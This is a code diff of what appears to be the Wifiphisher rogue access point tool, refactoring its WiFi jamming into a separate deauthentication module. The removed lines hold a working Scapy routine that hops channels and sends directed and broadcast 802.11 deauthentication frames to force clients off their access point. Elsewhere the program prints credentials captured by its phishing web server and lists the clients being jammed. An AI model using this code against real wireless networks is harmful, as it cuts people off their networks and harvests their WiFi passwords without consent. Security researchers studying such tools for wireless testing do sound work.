@@ -10,6 +10,7 @@ import sys
 import argparse
 import fcntl
 import pickle
+import deauth
 from blessings import Terminal
 from threading import Thread, Lock
 from subprocess import Popen, PIPE, check_output
@@ -154,10 +155,13 @@ def stopfilter(x):
     return False
 
 
-def shutdown(template=None, network_manager=None):
+def shutdown(deauthentication, template=None, network_manager=None):
     """
     Shutdowns program.
     """
+    # stop deauthentication
+    deauthentication.stop_deauthentication()
+
     print "[" + G + "+" + W + "] Captured credentials:"
     for c in phishinghttp.creds:
         print c
@@ -471,7 +475,7 @@ def dhcp_conf(interface):
         'no-resolv\n'
         'interface=%s\n'
         'dhcp-range=%s\n'
- #       'address=/#/%s'   
+ #       'address=/#/%s'
     )
 
     with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
@@ -508,128 +512,6 @@ def dhcp(dhcpconf, mon_iface):
          (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP)),
         shell=True)
     return True
-
-
-# Wifi Jammer stuff
-# TODO: Merge this with the other channel_hop method.
-def channel_hop2(mon_iface):
-    '''
-    First time it runs through the channels it stays on each channel for
-    5 seconds in order to populate the deauth list nicely.
-    After that it goes as fast as it can
-    '''
-    global monchannel, first_pass, args, jamming_daemon_running
-
-    channelNum = 0
-
-    if args.channel:
-        with lock:
-            monchannel = args.channel
-    while jamming_daemon_running:
-        if not args.channel:
-            channelNum += 1
-            if channelNum > 11:
-                channelNum = 1
-                with lock:
-                    first_pass = 0
-            with lock:
-                monchannel = channelNum
-            mon_iface.set_channel(monchannel)
-        output(monchannel)
-        if args.channel:
-            time.sleep(.05)
-        else:
-            # For the first channel hop thru, do not deauth
-            if first_pass == 1:
-                time.sleep(1)
-                continue
-        deauth(monchannel)
-
-
-def deauth(monchannel):
-    '''
-    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
-    if there's multi-APs to one gateway. Constantly scans the clients_APs list
-    and starts a thread to deauth each instance
-    '''
-
-    global clients_APs, APs, args
-
-    pkts = []
-
-    if len(clients_APs) > 0:
-        with lock:
-            for x in clients_APs:
-                client = x[0]
-                ap = x[1]
-                ch = x[2]
-                '''
-                Can't add a RadioTap() layer as the first layer or it's a
-                malformed Association request packet?
-                Append the packets to a new list so we don't have to hog the
-                lock type=0, subtype=12?
-                '''
-                if ch == monchannel:
-                    deauth_pkt1 = Dot11(
-                        addr1=client,
-                        addr2=ap,
-                        addr3=ap) / Dot11Deauth()
-                    deauth_pkt2 = Dot11(
-                        addr1=ap,
-                        addr2=client,
-                        addr3=client) / Dot11Deauth()
-                    pkts.append(deauth_pkt1)
-                    pkts.append(deauth_pkt2)
-    if len(APs) > 0:
-        if not args.directedonly:
-            with lock:
-                for a in APs:
-                    ap = a[0]
-                    ch = a[1]
-                    if ch == monchannel:
-                        deauth_ap = Dot11(
-                            addr1='ff:ff:ff:ff:ff:ff',
-                            addr2=ap,
-                            addr3=ap) / Dot11Deauth()
-                        pkts.append(deauth_ap)
-
-    if len(pkts) > 0:
-        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
-        if not args.timeinterval:
-            args.timeinterval = 0
-        if not args.deauthpackets:
-            args.deauthpackets = 1
-
-        for p in pkts:
-            send(p, inter=float(args.timeinterval),
-                 count=int(args.deauthpackets))
-
-
-def output(monchannel):
-    global clients_APs, APs, args
-    wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
-    with open(wifi_jammer_tmp, "a+") as log_file:
-        log_file.truncate()
-        with lock:
-            for ca in clients_APs:
-                if len(ca) > 3:
-                    log_file.write(
-                        ('[' + T + '*' + W + '] ' + O + ca[0] + W +
-                         ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) +
-                         ' - ' + T + ca[3] + W + '\n')
-                    )
-                else:
-                    log_file.write(
-                        '[' + T + '*' + W + '] ' + O + ca[0] + W +
-                        ' - ' + O + ca[1] + W + ' - ' + ca[2] + W + '\n'
-                    )
-        with lock:
-            for ap in APs:
-                log_file.write(
-                    '[' + T + '*' + W + '] ' + O + ap[0] + W +
-                    ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n'
-                )
-        # print ''
 
 
 def noise_filter(skip, addr1, addr2):
@@ -817,7 +699,7 @@ def run():
 
     network_manager = interfaces.NetworkManager()
     mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
-    fw = firewall.Fw() 
+    fw = firewall.Fw()
 
     # get interfaces for monitor mode and AP mode and set the monitor interface
     # to monitor mode. shutdown on any errors
@@ -972,15 +854,10 @@ def run():
 
     if not args.nojamming:
         monchannel = channel
-        # Start channel hopping
-        hop = Thread(target=channel_hop2, args=(mon_iface,))
-        hop.daemon = True
-        hop.start()
-
-    # Start sniffing
-    sniff_thread = Thread(target=sniff_dot11, args=(mon_iface.get_name(),))
-    sniff_thread.daemon = True
-    sniff_thread.start()
+        # start deauthenticating all client on target access point
+        deauthentication = deauth.Deauthentication(ap_mac,
+                                                   mon_iface.get_name())
+        deauthentication.deauthentiate()
 
     # Main loop.
     try:
@@ -993,12 +870,12 @@ def run():
                     print term.move(1, term.width - 30) + "|" + " " + term.bold_blue("Wifiphisher " + VERSION)
                     print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
                     print term.move(3, term.width - 30) + "|" + " Channel: " + channel
-                    print term.move(4, term.width - 30) + "|" + " AP interface: " + mon_iface.get_name() 
-                    print term.move(5, term.width - 30) + "|" + "_"*29 
-                    print term.move(1,0) + term.blue("Jamming devices: ")
-                    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
-                        proc = check_output(['tail', '-5', '/tmp/wifiphisher-jammer.tmp'])
-                        print term.move(4,0) + proc 
+                    print term.move(4, term.width - 30) + "|" + " AP interface: " + mon_iface.get_name()
+                    print term.move(5, term.width - 30) + "|" + "_"*29
+                    print term.move(1, 0) + term.blue("Jamming the following clients: ")
+                    if deauthentication.get_clients():
+                        for client in deauthentication.get_clients():
+                            print "[" + T + "*" + W + "] " + O + client + W
                     print term.move(9,0) + term.blue("DHCP Leases: ")
                     if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                         proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
@@ -1010,4 +887,4 @@ def run():
                     if phishinghttp.terminate and args.quitonsuccess:
                         raise KeyboardInterrupt
     except KeyboardInterrupt:
-        shutdown(template, network_manager)
+        shutdown(deauthentication, template, network_manager)
